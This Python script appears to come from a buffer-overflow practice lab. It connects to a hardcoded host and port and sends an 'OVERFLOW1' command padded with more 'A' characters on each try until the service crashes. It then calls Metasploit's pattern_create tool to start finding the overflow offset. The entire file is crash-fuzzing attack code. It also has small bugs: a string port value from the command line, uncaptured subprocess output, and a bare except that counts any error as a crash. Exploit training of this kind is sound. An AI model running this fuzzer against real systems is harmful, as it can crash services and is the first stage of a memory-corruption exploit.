#!/usr/bin/env python3

import socket
import time
import sys
import subprocess

help = """
Usage: fuzzing.py <ip> <port> <message>

| Name        | Code | Description    |
|-------------|------|----------------|
| Target IP   | -u   | Target IP      |
| Target port | -p   | Target Port    |
| Message     | -m   | Custom message |
|_____________|______|________________|
"""

ip = "10.10.91.131"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

if "-h" in sys.argv:
    print(help)
    exit(0)
if "-u" in sys.argv:
    ip = str(sys.argv[sys.argv.index("-u")+1])
if "-p" in sys.argv:
    port = str(sys.argv[sys.argv.index("-p")+1])
if "-m" in sys.argv:
    prefix = str(sys.argv[sys.argv.index("-m")+1]) + " "

string = prefix + "A"*100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        amount = (len(string)-len(prefix)) + 400
        print("Fuzzing crashed at {} bytes".format(len(string)-len(prefix)))
        result = subprocess.run(
            ['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l', str(amount)])
        print(str(result.stdout))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
